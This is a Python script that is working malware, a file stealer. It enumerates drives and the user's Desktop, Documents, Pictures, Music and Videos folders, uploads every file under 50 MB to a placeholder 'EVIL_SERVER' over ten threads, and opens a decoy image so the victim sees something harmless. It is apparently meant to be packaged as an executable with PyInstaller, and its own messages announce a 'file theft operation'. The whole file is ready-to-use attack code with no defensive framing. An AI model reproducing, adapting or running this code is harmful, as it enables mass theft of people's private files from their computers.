
import subprocess
import requests
import platform
import socket
import time
import sys
from PIL import Image
import threading
from queue import Queue
import os
EVIL_SERVER = "__SERVER__"
MAX_FILE_SIZE = 50 * 1024 * 1024  
def get_system_info():
    hostname = socket.gethostname()
    if platform.system() == "Windows":
        result = subprocess.run(['whoami'], capture_output=True, text=True, shell=True)
        user = result.stdout.strip().split('\\')[-1] if result.stdout else "unknown"
    else:
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        user = result.stdout.strip() if result.stdout else "unknown"
    return hostname, user
def get_all_drives():
    drives = []
    if platform.system() == "Windows":
        cmd = 'wmic logicaldisk get caption'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        for line in result.stdout.split('\n'):
            drive = line.strip()
            if drive and drive != "Caption" and drive.upper() != "C:":
                drives.append(drive + "\\")
    return drives
def get_special_folders():
    folders = []
    if platform.system() == "Windows":
        ps_script = '''
        [Environment]::GetFolderPath("Desktop"),
        [Environment]::GetFolderPath("MyMusic"),
        [Environment]::GetFolderPath("MyPictures"),
        [Environment]::GetFolderPath("MyDocuments"),
        [Environment]::GetFolderPath("MyVideos")
        '''
        cmd = f'powershell -Command "{ps_script}"'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        for folder in result.stdout.strip().split('\n'):
            if folder.strip():
                folders.append(folder.strip())
    return folders
def find_files_recursive(start_path):
    files = []
    if platform.system() == "Windows":
        cmd = f'dir "{start_path}" /s /b /a-d'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        for file_path in result.stdout.split('\n'):
            if file_path.strip():
                files.append(file_path.strip())
    return files
def send_file_to_server(file_path, hostname, user):
    try:
        file_size = 0
        try:
            if platform.system() == "Windows":
                cmd = f'powershell -Command "(Get-Item \'{file_path}\').length"'
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
                file_size = int(result.stdout.strip()) if result.stdout.strip().isdigit() else 0
        except:
            pass
        if file_size > MAX_FILE_SIZE:
            print(f"[!] Skipping large file: {file_path}")
            return False
        with open(file_path, 'rb') as f:
            files = {'files': (file_path.split('\\')[-1], f)}
            data = {'hostname': hostname, 'user': user}
            response = requests.post(f"{EVIL_SERVER}/upload", files=files, data=data)
            if response.status_code == 200:
                print(f"[+] Sent: {file_path}")
                return True
            else:
                print(f"[-] Failed: {file_path}")
                return False
    except Exception as e:
        print(f"[!] Error sending {file_path}: {str(e)}")
        return False
def worker(file_queue, hostname, user):
    while not file_queue.empty():
        file_path = file_queue.get()
        send_file_to_server(file_path, hostname, user)
        file_queue.task_done()
        time.sleep(0.1) 
def main():
    print("[+] Starting file theft operation...")
    hostname, user = get_system_info()
    print(f"[+] Target: {hostname} ({user})")
    search_paths = []
    drives = get_all_drives()
    search_paths.extend(drives)
    print(f"[+] Found drives: {drives}")
    special_folders = get_special_folders()
    search_paths.extend(special_folders)
    print(f"[+] Special folders: {special_folders}")
    all_files = []
    for path in search_paths:
        print(f"[*] Searching: {path}")
        try:
            files = find_files_recursive(path)
            all_files.extend(files)
            print(f"[+] Found {len(files)} files in {path}")
        except Exception as e:
            print(f"[!] Error searching {path}: {str(e)}")
    print(f"[+] Total files found: {len(all_files)}")
    file_queue = Queue()
    for file_path in all_files:
        file_queue.put(file_path)
    num_threads = min(10, len(all_files))
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(file_queue, hostname, user))
        t.start()
        threads.append(t)
    file_queue.join()
    for t in threads:
        t.join()
    print("[+] File theft complete! All data sent to evil server.")
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
def open_image(relative_path):
    image_path = resource_path(relative_path)
    Image.open(image_path).show()
if __name__ == "__main__":
    try:
        threading.Thread(target=open_image,args=("picture.jpg",),daemon=True).start()
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted")
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")